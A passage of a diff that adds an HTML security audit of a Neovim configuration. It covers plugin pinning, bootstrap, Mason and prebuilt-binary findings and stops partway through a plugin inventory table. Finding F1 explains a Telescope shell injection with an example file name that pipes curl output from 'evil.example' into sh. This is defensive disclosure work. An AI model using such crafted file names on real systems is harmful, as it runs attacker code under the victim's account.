@@ -1,0 +1,676 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>nvim-config Security Audit</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=IBM+Plex+Sans+Condensed:wght@500;600;700&family=IBM+Plex+Sans:ital,wght@0,400;0,500;0,600;1,400&display=swap">
+<style>
+/* Layout: one reading column for prose (~68ch) inside a wider frame that tables can use; summary first, then findings, then inventories. */
+:root {
+  --paper: #f5f7fa;
+  --sheet: #ffffff;
+  --ink: #18212d;
+  --muted: #586374;
+  --rule: #d9dfe7;
+  --accent: #1d5c86;
+  --code-bg: #eef2f6;
+  --high: #b3261e;      --high-bg: #fbe9e7;
+  --medium: #9a5b00;    --medium-bg: #fdf1dc;
+  --low: #2f5f8f;       --low-bg: #e6eff8;
+  --info: #5b6472;      --info-bg: #eceff3;
+  --ok: #2c7a4b;        --ok-bg: #e4f3ea;
+  --font-display: "IBM Plex Sans Condensed", "Arial Narrow", "Roboto Condensed", system-ui, sans-serif;
+  --font-body: "IBM Plex Sans", system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  --font-mono: "IBM Plex Mono", ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+  color-scheme: light;
+}
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) {
+    --paper: #10151c; --sheet: #161d26; --ink: #e3e8ef; --muted: #9aa6b6; --rule: #2a3441;
+    --accent: #7db6e3; --code-bg: #1e2732;
+    --high: #f28b82; --high-bg: #3a1d1c; --medium: #e8b05a; --medium-bg: #36290f;
+    --low: #8fbbe6; --low-bg: #182a3d; --info: #a9b3c1; --info-bg: #232b36;
+    --ok: #74c69a; --ok-bg: #16301f;
+    color-scheme: dark;
+  }
+}
+:root[data-theme="dark"] {
+  --paper: #10151c; --sheet: #161d26; --ink: #e3e8ef; --muted: #9aa6b6; --rule: #2a3441;
+  --accent: #7db6e3; --code-bg: #1e2732;
+  --high: #f28b82; --high-bg: #3a1d1c; --medium: #e8b05a; --medium-bg: #36290f;
+  --low: #8fbbe6; --low-bg: #182a3d; --info: #a9b3c1; --info-bg: #232b36;
+  --ok: #74c69a; --ok-bg: #16301f;
+  color-scheme: dark;
+}
+
+* { box-sizing: border-box; }
+html { -webkit-text-size-adjust: 100%; }
+body {
+  margin: 0;
+  background: var(--paper);
+  color: var(--ink);
+  font: 400 15.5px/1.6 var(--font-body);
+  padding-top: env(safe-area-inset-top, 0px);
+  padding-bottom: env(safe-area-inset-bottom, 0px);
+}
+.frame {
+  max-width: 1120px;
+  margin: 0 auto;
+  padding-block: 40px 72px;
+  padding-left: max(16px, env(safe-area-inset-left, 0px));
+  padding-right: max(16px, env(safe-area-inset-right, 0px));
+  display: grid;
+  gap: 48px;
+}
+/* Grid children default to min-width:auto and would stretch to the wide tables; let them shrink so tables scroll inside their own wrapper. */
+.frame > *, .stack > *, .finding > *, .verdict > *, section > * { min-width: 0; }
+.prose { max-width: 68ch; }
+a { color: var(--accent); text-underline-offset: 2px; }
+a:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; border-radius: 2px; }
+code, pre, .mono { font-family: var(--font-mono); font-size: 0.88em; }
+:not(pre) > code { background: var(--code-bg); padding: 0.05em 0.35em; border-radius: 3px; overflow-wrap: anywhere; }
+pre {
+  margin: 0; background: var(--code-bg); border: 1px solid var(--rule); border-radius: 6px;
+  padding: 12px 14px; overflow-x: auto; line-height: 1.5; font-size: 0.85em;
+}
+h1, h2, h3 { font-family: var(--font-display); text-wrap: balance; margin: 0; line-height: 1.15; }
+h1 { font-size: clamp(2rem, 4.6vw, 2.9rem); font-weight: 700; letter-spacing: -0.01em; }
+h2 { font-size: 1.6rem; font-weight: 600; }
+h3 { font-size: 1.18rem; font-weight: 600; }
+p { margin: 0; }
+.stack { display: grid; gap: 14px; }
+.eyebrow {
+  font-family: var(--font-mono); font-size: 0.75rem; letter-spacing: 0.08em; text-transform: uppercase; color: var(--muted);
+}
+section > header { display: grid; gap: 6px; margin-bottom: 18px; }
+section > header p { color: var(--muted); max-width: 68ch; }
+
+/* masthead */
+.masthead { display: grid; gap: 18px; border-bottom: 1px solid var(--rule); padding-bottom: 28px; }
+.meta { display: flex; flex-wrap: wrap; gap: 8px 28px; margin: 0; }
+.meta div { display: grid; gap: 2px; }
+.meta dt { font-size: 0.72rem; letter-spacing: 0.08em; text-transform: uppercase; color: var(--muted); }
+.meta dd { margin: 0; font-family: var(--font-mono); font-size: 0.88rem; }
+.lede { font-size: 1.12rem; max-width: 64ch; }
+
+/* verdict */
+.verdict {
+  background: var(--sheet); border: 1px solid var(--rule); border-radius: 8px;
+  padding: 22px 22px; display: grid; gap: 18px;
+}
+.verdict .answer { font-family: var(--font-display); font-size: 1.35rem; font-weight: 600; line-height: 1.3; max-width: 60ch; }
+.tally { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 0; border-top: 1px solid var(--rule); }
+.tally div { padding: 14px 14px 4px 0; display: grid; gap: 2px; }
+.tally b { font-family: var(--font-display); font-size: 1.9rem; font-weight: 600; font-variant-numeric: tabular-nums; line-height: 1.1; }
+.tally span { color: var(--muted); font-size: 0.86rem; }
+
+/* pills */
+.pill {
+  display: inline-block; font-size: 0.72rem; font-weight: 600; letter-spacing: 0.04em; text-transform: uppercase;
+  padding: 2px 8px; border-radius: 999px; white-space: nowrap; border: 1px solid transparent; line-height: 1.5;
+}
+.high { color: var(--high); background: var(--high-bg); }
+.medium { color: var(--medium); background: var(--medium-bg); }
+.low { color: var(--low); background: var(--low-bg); }
+.info { color: var(--info); background: var(--info-bg); }
+.fixed, .ok { color: var(--ok); background: var(--ok-bg); }
+.action { color: var(--medium); background: transparent; border-color: currentColor; }
+.open { color: var(--muted); background: transparent; border-color: var(--rule); }
+.note { }
+.pill.note { color: var(--info); background: var(--info-bg); }
+.pill.issue { color: var(--medium); background: var(--medium-bg); }
+
+/* tables */
+.table-wrap { overflow-x: auto; border: 1px solid var(--rule); border-radius: 8px; background: var(--sheet); }
+table { border-collapse: collapse; width: 100%; font-size: 0.92rem; }
+th, td { text-align: left; vertical-align: top; padding: 10px 12px; border-bottom: 1px solid var(--rule); }
+tbody tr:last-child > * { border-bottom: 0; }
+thead th {
+  font-size: 0.72rem; letter-spacing: 0.08em; text-transform: uppercase; color: var(--muted); font-weight: 600;
+  background: var(--paper); white-space: nowrap;
+}
+tbody th { font-weight: 600; }
+td.num, .num { font-variant-numeric: tabular-nums; white-space: nowrap; font-family: var(--font-mono); font-size: 0.85rem; }
+.findings-index td:first-child, .findings-index th:first-child { width: 3.5rem; }
+.findings-index a { color: inherit; text-decoration: none; }
+.findings-index a:hover { text-decoration: underline; }
+.plugins { min-width: 880px; }
+.plugins th[scope="row"] a { color: var(--ink); text-decoration: none; }
+.plugins th[scope="row"] a:hover { text-decoration: underline; }
+.owner, .ref { display: block; font-weight: 400; color: var(--muted); font-size: 0.8rem; }
+.ref { font-family: var(--font-mono); }
+code.sha { background: none; padding: 0; font-size: 0.85rem; }
+td.note { color: var(--ink); min-width: 320px; }
+.downloads { min-width: 860px; }
+.hashes { min-width: 640px; }
+.hashes code { font-size: 0.8rem; overflow-wrap: anywhere; }
+
+/* findings */
+.finding { display: grid; gap: 10px; padding-block: 22px; border-top: 1px solid var(--rule); }
+.finding:first-of-type { border-top: 0; padding-top: 0; }
+.finding .head { display: flex; flex-wrap: wrap; align-items: baseline; gap: 8px 12px; }
+.finding .id { font-family: var(--font-mono); color: var(--muted); font-size: 0.9rem; }
+.finding .tags { display: flex; gap: 6px; flex-wrap: wrap; }
+.finding p, .finding ul { max-width: 72ch; }
+.finding ul { margin: 0; padding-left: 1.2em; display: grid; gap: 4px; }
+.kv { display: grid; grid-template-columns: max-content 1fr; gap: 4px 14px; max-width: 80ch; margin: 0; font-size: 0.93rem; }
+.kv dt { color: var(--muted); }
+.kv dd { margin: 0; min-width: 0; }
+
+.steps { counter-reset: step; display: grid; gap: 22px; margin: 0; padding: 0; list-style: none; }
+.steps li { display: grid; gap: 8px; grid-template-columns: 2rem minmax(0, 1fr); }
+.steps li::before {
+  counter-increment: step; content: counter(step);
+  font-family: var(--font-display); font-weight: 600; font-size: 1.2rem; color: var(--accent);
+}
+.steps li > div { display: grid; gap: 8px; min-width: 0; }
+
+.cols { display: grid; gap: 28px; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); }
+.cols > div { min-width: 0; display: grid; gap: 10px; align-content: start; }
+ul.plain { margin: 0; padding-left: 1.2em; display: grid; gap: 6px; }
+footer { color: var(--muted); font-size: 0.85rem; border-top: 1px solid var(--rule); padding-top: 18px; }
+
+@media (max-width: 560px) {
+  body { font-size: 15px; }
+  .kv { grid-template-columns: 1fr; }
+  .kv dt { margin-top: 6px; }
+}
+@media (prefers-reduced-motion: reduce) { * { scroll-behavior: auto !important; } }
+</style>
+</head>
+<body>
+<main class="frame">
+
+  <header class="masthead">
+    <span class="eyebrow">Supply-chain audit &middot; Neovim configuration</span>
+    <h1>nvim-config Security Audit</h1>
+    <p class="lede">A review of every third-party package this config installs: where each one comes from, what version is locked, and whether the code does anything it shouldn't. All packages are now pinned to exact versions.</p>
+    <dl class="meta">
+      <div><dt>Repository</dt><dd>mosukiton/nvim-config</dd></div>
+      <div><dt>Branch</dt><dd>claude/vibrant-curie-9cu4a0</dd></div>
+      <div><dt>Audited</dt><dd>2026-11-24</dd></div>
+      <div><dt>Scope</dt><dd>30 plugins &middot; 3 LSP servers &middot; 1 .NET tool</dd></div>
+    </dl>
+  </header>
+
+  <section class="verdict" aria-labelledby="verdict-h">
+    <span class="eyebrow" id="verdict-h">Verdict</span>
+    <p class="answer">No malicious or suspicious code in any of the 30 plugins. One real vulnerability, a shell injection in Telescope's file previewer, is fixed by moving its pin to the upstream patch.</p>
+    <p class="prose">Before this audit only <code>lazy-lock.json</code> held versions, so any <code>:Lazy update</code> would have pulled the newest commit of every plugin. Mason servers, the Mason registry, the lazy.nvim bootstrap and the Roslyn tool all floated to "latest". Each of those is now pinned, and the config refuses to start if someone adds a plugin without a pin.</p>
+    <div class="tally">
+      <div><b>30 / 30</b><span>plugins pinned to a commit SHA</span></div>
+      <div><b>0</b><span>malicious or suspicious findings</span></div>
+      <div><b>1</b><span>vulnerability fixed (Telescope)</span></div>
+      <div><b>5,303</b><span>files scanned, 1,010 pattern hits reviewed</span></div>
+    </div>
+  </section>
+
+  <section aria-labelledby="findings-h">
+    <header>
+      <h2 id="findings-h">Findings</h2>
+      <p>Severity is the impact on you with this config as written. Status says whether the fix is already in the branch or needs you to do something.</p>
+    </header>
+    <div class="table-wrap">
+      <table class="findings-index">
+        <thead><tr><th>ID</th><th>Severity</th><th>Finding</th><th>Status</th></tr></thead>
+        <tbody>
+          <tr><td class="num">F1</td><td><span class="pill high">High</span></td><td><a href="#f1">Telescope previewer runs file names through the shell</a></td><td><span class="pill fixed">Fixed</span></td></tr>
+          <tr><td class="num">F2</td><td><span class="pill medium">Medium</span></td><td><a href="#f2">Plugin versions were not pinned in the spec</a></td><td><span class="pill fixed">Fixed</span></td></tr>
+          <tr><td class="num">F3</td><td><span class="pill medium">Medium</span></td><td><a href="#f3">lazy.nvim bootstrap followed the moving <code>stable</code> tag</a></td><td><span class="pill fixed">Fixed</span></td></tr>
+          <tr><td class="num">F4</td><td><span class="pill medium">Medium</span></td><td><a href="#f4">Mason registry and language servers floated to latest</a></td><td><span class="pill action">Action needed</span></td></tr>
+          <tr><td class="num">F5</td><td><span class="pill medium">Medium</span></td><td><a href="#f5">Roslyn server installed as "newest prerelease"</a></td><td><span class="pill action">Action needed</span></td></tr>
+          <tr><td class="num">F6</td><td><span class="pill low">Low</span></td><td><a href="#f6">lazy.nvim loads project-local <code>.lazy.lua</code> files</a></td><td><span class="pill fixed">Fixed</span></td></tr>
+          <tr><td class="num">F7</td><td><span class="pill low">Low</span></td><td><a href="#f7">lazy.nvim luarocks / hererocks support was enabled</a></td><td><span class="pill fixed">Fixed</span></td></tr>
+          <tr><td class="num">F8</td><td><span class="pill low">Low</span></td><td><a href="#f8">Snacks downloads an unverified <code>sqlite3.dll</code> on Windows</a></td><td><span class="pill open">Open</span></td></tr>
+          <tr><td class="num">F9</td><td><span class="pill low">Low</span></td><td><a href="#f9">blink.cmp loads a prebuilt native library</a></td><td><span class="pill open">Accepted</span></td></tr>
+          <tr><td class="num">F10</td><td><span class="pill low">Low</span></td><td><a href="#f10">telescope-project passes paths to <code>:tcd</code> unescaped</a></td><td><span class="pill open">Open</span></td></tr>
+          <tr><td class="num">F11</td><td><span class="pill info">Info</span></td><td><a href="#f11">Unmaintained and unused plugins</a></td><td><span class="pill open">Open</span></td></tr>
+          <tr><td class="num">F12</td><td><span class="pill info">Info</span></td><td><a href="#f12">Treesitter parsers are pinned indirectly and not hash-checked</a></td><td><span class="pill open">Open</span></td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <section aria-label="Finding details" class="stack">
+
+    <article class="finding" id="f1">
+      <div class="head"><span class="id">F1</span><h3>Telescope previewer runs file names through the shell</h3>
+        <span class="tags"><span class="pill high">High</span><span class="pill fixed">Fixed</span></span></div>
+      <dl class="kv">
+        <dt>Where</dt><dd><code>telescope.nvim/lua/telescope/previewers/buffer_previewer.lua:158</code> at the previously locked commit <code>40aedd8</code> (2026-08-17)</dd>
+        <dt>Trigger</dt><dd>Telescope previews a file whose type Neovim can't detect, the <code>file</code> utility is installed, and <code>check_mime_type</code> is on (the default everywhere except Windows)</dd>
+      </dl>
+      <p>To decide whether a file is binary, Telescope ran <code>io.popen('file --mime-type -b "' .. filepath .. '"')</code>. Double quotes don't stop <code>$(&hellip;)</code> or backticks, so a file in a cloned repository named something like <code>notes$(curl -s evil.example|sh)</code> runs that command as you as soon as it appears in a Telescope preview. I confirmed the expansion with a test file named <code>README$(id -un&gt;&amp;2)</code>: the shell printed the user name.</p>
+      <p>Your main file and grep pickers are Snacks, which isn't affected, but Telescope is still used by <code>gO</code>, <code>gW</code>, <code>grt</code> and any <code>:Telescope</code> command.</p>
+      <p><strong>Fix applied:</strong> pinned to upstream <code>1e1bab7</code> (2026-11-08, "fix(previewers): don't run file names through the shell in the mime check"). It's the only commit between the old pin and upstream <code>master</code>, and its diff only replaces this call with <code>vim.system({ "file", "--mime-type", "-b", filepath })</code>.</p>
+    </article>
+
+    <article class="finding" id="f2">
+      <div class="head"><span class="id">F2</span><h3>Plugin versions were not pinned in the spec</h3>
+        <span class="tags"><span class="pill medium">Medium</span><span class="pill fixed">Fixed</span></span></div>
+      <p>Only <code>lazy-lock.json</code> recorded commits. <code>:Lazy update</code>, <code>:Lazy sync</code> or <kbd>U</kbd> in the Lazy window would move every plugin to the head of its branch and rewrite the lockfile, so a compromised upstream commit would arrive with your next update. <code>blink.cmp</code> and <code>LuaSnip</code> also used version ranges (<code>1.*</code>, <code>2.*</code>) that follow new tags automatically.</p>
+      <p><strong>Fix applied:</strong> new <code>lua/mosukiton/pins.lua</code> holds one full SHA per plugin. <code>plugins.lua</code> attaches <code>commit = &lt;sha&gt;</code> to every spec, including dependencies written as plain strings, and stops with an error naming the plugin if a pin is missing. In lazy.nvim a <code>commit</code> takes precedence over <code>branch</code> and <code>version</code>, so updates can't move past it. All 30 pins match <code>lazy-lock.json</code>.</p>
+    </article>
+
+    <article class="finding" id="f3">
+      <div class="head"><span class="id">F3</span><h3>lazy.nvim bootstrap followed the moving <code>stable</code> tag</h3>
+        <span class="tags"><span class="pill medium">Medium</span><span class="pill fixed">Fixed</span></span></div>
+      <p>On a fresh machine the bootstrap ran <code>git clone --branch=stable</code>. <code>stable</code> is a tag that is moved on every lazy.nvim release, so new installs got whatever it pointed to that day, before the lockfile had any say.</p>
+      <p><strong>Fix applied:</strong> the bootstrap clones, checks out the pinned SHA <code>306a055</code>, confirms <code>HEAD</code> matches, and deletes the checkout and stops if any step fails.</p>
+    </article>
+
+    <article class="finding" id="f4">
+      <div class="head"><span class="id">F4</span><h3>Mason registry and language servers floated to latest</h3>
+        <span class="tags"><span class="pill medium">Medium</span><span class="pill action">Action needed</span></span></div>
+      <p>Mason resolved packages from the newest <code>mason-registry</code> release, and <code>ensure_installed</code> took whatever version that release named. The registry is effectively code: it tells Mason which binaries to download, and Mason evaluates its template expressions as Lua (<code>mason-core/installer/compiler/expr.lua</code>). Mason does not verify package downloads beyond HTTPS.</p>
+      <p><strong>Fix applied:</strong> registry pinned to <code>github:mason-org/mason-registry@2026-11-23-caring-song</code> (release assets confirmed present). <code>ensure_installed</code> now lists <code>lua_ls@3.19.2</code>, <code>basedpyright@1.40.2</code> and <code>clangd@23.1.0</code>, the versions in that snapshot, and errors if a server in <code>servers</code> has no pin.</p>
+      <p><strong>You need to:</strong> <code>ensure_installed</code> only installs missing packages, so servers you already have keep their current versions. Reinstall them once at the pinned versions (commands in <a href="#next">Next steps</a>).</p>
+    </article>
+
+    <article class="finding" id="f5">
+      <div class="head"><span class="id">F5</span><h3>Roslyn server installed as "newest prerelease"</h3>
+        <span class="tags"><span class="pill medium">Medium</span><span class="pill action">Action needed</span></span></div>
+      <p><code>roslyn.lua</code> documented <code>dotnet tool install --global roslyn-language-server --prerelease</code>, which installs whatever is newest on nuget.org. The package itself checks out: authored by Microsoft, project URL <code>github.com/dotnet/roslyn</code>, and it's the one roslyn.nvim's README points to.</p>
+      <p><strong>Fix applied:</strong> the install comment now pins <code>5.13.0-1.26514.10</code> (newest on nuget.org, published 2026-10-15) and the version is recorded in <code>pins.lua</code>. This tool lives outside Neovim, so the update is yours to run.</p>
+    </article>
+
+    <article class="finding" id="f6">
+      <div class="head"><span class="id">F6</span><h3>lazy.nvim loads project-local <code>.lazy.lua</code> files</h3>
+        <span class="tags"><span class="pill low">Low</span><span class="pill fixed">Fixed</span></span></div>
+      <p>With <code>local_spec</code> on (the default), lazy.nvim looks for <code>.lazy.lua</code> in the working directory and every parent. Neovim's trust prompt (<code>vim.secure.read</code>) guards it, but accepting the prompt in a cloned repository runs that file's Lua and lets it add plugins that never pass through your pins.</p>
+      <p><strong>Fix applied:</strong> <code>local_spec = false</code>. If you rely on <code>.lazy.lua</code> in your own projects, those files will stop loading.</p>
+    </article>
+
+    <article class="finding" id="f7">
+      <div class="head"><span class="id">F7</span><h3>lazy.nvim luarocks / hererocks support was enabled</h3>
+        <span class="tags"><span class="pill low">Low</span><span class="pill fixed">Fixed</span></span></div>
+      <p>When a plugin ships a rockspec with dependencies, lazy.nvim installs them from luarocks, and if <code>luarocks</code> isn't on your PATH it first builds Lua and LuaRocks with hererocks (<code>-r latest</code>). None of that is pinned. No current plugin triggers it: plenary's <code>luassert</code> dependency is covered by lazy's built-in community spec, and the nvim-lspconfig and telescope rockspecs only list <code>lua</code> and plenary.</p>
+      <p><strong>Fix applied:</strong> <code>rocks = { enabled = false }</code>, so a future plugin bump can't start pulling rocks silently. <code>checker</code> is also explicitly off.</p>
+    </article>
+
+    <article class="finding" id="f8">
+      <div class="head"><span class="id">F8</span><h3>Snacks downloads an unverified <code>sqlite3.dll</code> on Windows</h3>
+        <span class="tags"><span class="pill low">Low</span><span class="pill open">Open</span></span></div>
+      <p>Your picker config sets <code>frecency = true</code>, which Snacks stores in SQLite. On Windows it downloads <code>https://www.sqlite.org/2025/sqlite-dll-win-&lt;arch&gt;-3480000.zip</code> through PowerShell, extracts <code>sqlite3.dll</code> into Neovim's cache directory with no checksum, and loads it into the editor via LuaJIT FFI. Linux and macOS use the system <code>libsqlite3</code> instead.</p>
+      <p><strong>Recommendation</strong> (only matters on Windows): add <code>db = { sqlite3_path = "C:/path/to/verified/sqlite3.dll" }</code> to <code>lua/mosukiton/snacks/picker.lua</code>, using a DLL whose hash you've checked against sqlite.org, or set <code>frecency = false</code>.</p>
+    </article>
+
+    <article class="finding" id="f9">
+      <div class="head"><span class="id">F9</span><h3>blink.cmp loads a prebuilt native library</h3>
+        <span class="tags"><span class="pill low">Low</span><span class="pill open">Accepted</span></span></div>
+      <p>With <code>fuzzy.implementation = "prefer_rust_with_warning"</code>, blink.cmp downloads its Rust fuzzy matcher for the checked-out tag (<code>v1.10.2</code>) from GitHub Releases with <code>curl</code> and loads it into Neovim. The <code>.sha256</code> it checks comes from the same release, so it catches a corrupted download but not a tampered release.</p>
+      <p>I downloaded the v1.10.2 assets: the published and computed SHA-256 values match (below). The Linux library imports only libc memory, file and clock functions plus the Lua C API; no sockets, process spawning or <code>dlopen</code>, and no embedded URLs beyond the compiler banner. Because the pin sits on the tagged commit, the binary can't change unless the pin does. Keep the pin on a tagged commit, or blink falls back to the Lua matcher with a warning.</p>
+      <div class="table-wrap">
+        <table class="hashes">
+          <thead><tr><th>Asset (v1.10.2)</th><th>SHA-256</th></tr></thead>
+          <tbody>
+            <tr><td><code>x86_64-unknown-linux-gnu.so</code></td><td><code>1b09e702955be4e2565206d8649db674ccb77477495ed787868f451bf33cea2f</code></td></tr>
+            <tr><td><code>x86_64-pc-windows-msvc.dll</code></td><td><code>86979ab676573a51d56245832126ca343b591e4f7be92c86d343eab40fe875de</code></td></tr>
+            <tr><td><code>aarch64-apple-darwin.dylib</code></td><td><code>ceeae0c3f72af97ee64b816256638883a67396430445829e2afc938246a36945</code></td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p>To avoid prebuilt code entirely, set <code>fuzzy = { implementation = "lua" }</code> in <code>blink-cmp.lua</code>, or build from source with <code>build = "cargo build --release"</code> (needs a Rust toolchain).</p>
+    </article>
+
+    <article class="finding" id="f10">
+      <div class="head"><span class="id">F10</span><h3>telescope-project passes paths to <code>:tcd</code> unescaped</h3>
+        <span class="tags"><span class="pill low">Low</span><span class="pill open">Open</span></span></div>
+      <p><code>change_project_dir</code> runs <code>vim.fn.execute("tcd " .. project_path)</code>. A project directory whose name contains <code>|</code> would run the rest of the name as another Ex command, including <code>!</code> shell commands. Your config never loads this extension (only <code>projections</code> is loaded, and the <code>&lt;leader&gt;o</code> mapping is commented out); <code>telescope.lua</code> only requires its actions module.</p>
+      <p><strong>Recommendation:</strong> remove <code>telescope-project.nvim</code> from <code>plugins.lua</code> and <code>pins.lua</code>, along with the <code>project_actions</code> require and the <code>project</code> extension block in <code>telescope.lua</code>.</p>
+    </article>
+
+    <article class="finding" id="f11">
+      <div class="head"><span class="id">F11</span><h3>Unmaintained and unused plugins</h3>
+        <span class="tags"><span class="pill info">Info</span><span class="pill open">Open</span></span></div>
+      <p>Each installed plugin is code that runs with your permissions, so dead weight is worth removing.</p>
+      <ul>
+        <li><strong>projections.nvim</strong>: last commit 2023-05-18 on <code>pre_release</code>. Clean and small today, but no fixes will come. Consider a maintained session manager.</li>
+        <li><strong>mason-tool-installer.nvim</strong>: listed as an nvim-lspconfig dependency but never set up, so it does nothing.</li>
+        <li><strong>telescope-project.nvim</strong>: never loaded (see F10).</li>
+        <li><strong>Comment.nvim</strong>: quiet upstream since 2024-06. Neovim 0.10+ ships <code>gc</code>/<code>gcc</code> commenting, which works with <code>nvim-ts-context-commentstring</code>.</li>
+      </ul>
+    </article>
+
+    <article class="finding" id="f12">
+      <div class="head"><span class="id">F12</span><h3>Treesitter parsers are pinned indirectly and not hash-checked</h3>
+        <span class="tags"><span class="pill info">Info</span><span class="pill open">Open</span></span></div>
+      <p>On its <code>main</code> branch, nvim-treesitter downloads <code>https://github.com/&lt;repo&gt;/archive/&lt;revision&gt;.tar.gz</code> for each parser at the revision listed in its own <code>parsers.lua</code>, then compiles it. Pinning nvim-treesitter therefore pins parser sources. For your languages, bash, lua, markdown and markdown_inline use commit SHAs; <code>c_sharp</code> (<code>v0.23.5</code>) and <code>python</code> (<code>v0.25.0</code>) use tags, which their maintainers could move. Tarballs are not hash-verified.</p>
+      <p>Separately, <code>main</code> ignores <code>ensure_installed</code>, <code>auto_install</code>, <code>highlight</code> and <code>indent</code> from your <code>treesitter.lua</code>; its <code>setup()</code> only reads <code>install_dir</code>. Nothing is auto-installed, which is the safer outcome, but those settings aren't doing what they say.</p>
+    </article>
+  </section>
+
+  <section aria-labelledby="plugins-h">
+    <header>
+      <h2 id="plugins-h">Plugin inventory</h2>
+      <p>Every plugin at the commit it's now pinned to. Each SHA was confirmed to exist in the canonical repository and to be reachable from an upstream branch or tag, which rules out commits that only exist in a fork. Hover a SHA for the full 40 characters.</p>
+    </header>
+    <div class="table-wrap">
+      <table class="plugins">
+        <thead><tr><th>Plugin</th><th>Pinned commit</th><th>Committed</th><th>Result</th><th>Notes</th></tr></thead>
+        <tbody>
+        <tr>
+          <th scope="row"><a href="https://github.com/saghen/blink.cmp">blink.cmp</a><span class="owner">saghen</span></th>
+          <td><code class="sha" title="78336bc89ee5365633bcf754d93df01678b5c08f">78336bc89ee5</code><span class="ref">v1.10.2</span></td>
+          <td class="num">2026-04-04</td>
+          <td><span class="pill note">Note</span></td>
+          <td class="note">Downloads a prebuilt native fuzzy matcher for tag v1.10.2 (F9). Hashes verified; Linux library has no network or process imports.</td>
+        </tr>
+        <tr>
+          <th scope="row"><a href="https://github.com/numToStr/Comment.nvim">Comment.nvim</a><span class="owner">numToStr</span></th>
+          <td><code class="sha" title="e30b7f2008e52442154b66f7c519bfd2f1e32acb">e30b7f2008e5</code><span class="ref">v0.8.0-59-ge30b7f2</span></td>
+          <td class="num">2024-06-09</td>
+          <td><span class="pill ok">Clean</span></td>
+          <td class="note">Pure Lua. Upstream quiet since 2024-06; Neovim has built-in <code>gc</code> now.</td>
+        </tr>
+        <tr>
+          <th scope="row"><a href="https://github.com/hat0uma/csvview.nvim">csvview.nvim</a><span class="owner">hat0uma</span></th>
+          <td><code class="sha" title="2466bdda54047f525d4faca53040fe657c9c33db">2466bdda5404</code><span class="ref">v1.3.0-13-g2466bdd</span></td>
+          <td class="num">2026-09-01</td>
+          <td><span class="pill ok">Clean</span></td>
+          <td class="note">Pure Lua, no process or network calls.</td>
+        </tr>
+        <tr>
+          <th scope="row"><a href="https://github.com/j-hui/fidget.nvim">fidget.nvim</a><span class="owner">j-hui</span></th>
+          <td><code class="sha" title="6f793b2bcd2d35e201c09520f698bb763220908a">6f793b2bcd2d</code><span class="ref">v2.0.0-2-g6f793b2</span></td>
+          <td class="num">2026-06-21</td>
+          <td><span class="pill ok">Clean</span></td>
+          <td class="note">Notification UI only.</td>
+        </tr>
+        <tr>
+          <th scope="row"><a href="https://github.com/rafamadriz/friendly-snippets">friendly-snippets</a><span class="owner">rafamadriz</span></th>
+          <td><code class="sha" title="6cd7280adead7f586db6fccbd15d2cac7e2188b9">6cd7280adead</code><span class="ref">(no tags)</span></td>
+          <td class="num">2026-01-23</td>
+          <td><span class="pill ok">Clean</span></td>
+          <td class="note">JSON snippet data only (144 files). Snippets insert text and cannot run code.</td>
+        </tr>
+        <tr>
+          <th scope="row"><a href="https://github.com/A7Lavinraj/fyler.nvim">fyler.nvim</a><span class="owner">A7Lavinraj</span></th>
+          <td><code class="sha" title="70e1202434a21b45649dd59ec82dc3330f79125e">70e1202434a2</code><span class="ref">v2.0.0-178-g70e1202</span></td>
+          <td class="num">2026-06-28</td>
+          <td><span class="pill ok">Clean</span></td>
+          <td class="note">Runs <code>git status</code> for icons and OS trash commands with argument lists / escaped PowerShell strings.</td>
+        </tr>
+        <tr>
+          <th scope="row"><a href="https://github.com/lukas-reineke/indent-blankline.nvim">indent-blankline.nvim</a><span class="owner">lukas-reineke</span></th>
+          <td><code class="sha" title="d28a3f70721c79e3c5f6693057ae929f3d9c0a03">d28a3f70721c</code><span class="ref">v3.9.1</span></td>
+          <td class="num">2026-02-17</td>
+          <td><span class="pill ok">Clean</span></td>
+          <td class="note">Pure Lua, no process or network calls.</td>
+        </tr>
+        <tr>
+          <th scope="row"><a href="https://github.com/folke/lazy.nvim">lazy.nvim</a><span class="owner">folke</span></th>
+          <td><code class="sha" title="306a05526ada86a7b30af95c5cc81ffba93fef97">306a05526ada</code><span class="ref">stable-4-g306a055</span></td>
+          <td class="num">2025-12-17</td>
+          <td><span class="pill ok">Clean</span></td>
+          <td class="note">Plugin manager. Runs git by design. Bootstrap now pinned; <code>.lazy.lua</code> and luarocks support switched off.</td>
+        </tr>
+        <tr>
+          <th scope="row"><a href="https://github.com/folke/lazydev.nvim">lazydev.nvim</a><span class="owner">folke</span></th>
+          <td><code class="sha" title="ff2cbcba459b637ec3fd165a2be59b7bbaeedf0d">ff2cbcba459b</code><span class="ref">stable-7-gff2cbcb</span></td>
+          <td class="num">2026-03-14</td>
+          <td><span class="pill ok">Clean</span></td>
+          <td class="note">Runs <code>git rev-parse</code> to find workspace roots. Nothing else.</td>
+        </tr>
+        <tr>
+          <th scope="row"><a href="https://github.com/ray-x/lsp_signature.nvim">lsp_signature.nvim</a><span class="owner">ray-x</span></th>
+          <td><code class="sha" title="b7ace9ddb1640ce266012a45a672dfdaedfa5ec6">b7ace9ddb164</code><span class="ref">v0.3.1-78-gb7ace9d</span></td>
+          <td class="num">2026-05-19</td>
+          <td><span class="pill ok">Clean</span></td>
+          <td class="note">Pure Lua UI around LSP signature help.</td>
+        </tr>
+        <tr>
+          <th scope="row"><a href="https://github.com/L3MON4D3/LuaSnip">LuaSnip</a><span class="owner">L3MON4D3</span></th>
+          <td><code class="sha" title="642b0c595e11608b4c18219e93b88d7637af27bc">642b0c595e11</code><span class="ref">v2.5.0</span></td>
+          <td class="num">2026-03-21</td>
+          <td><span class="pill ok">Clean</span></td>
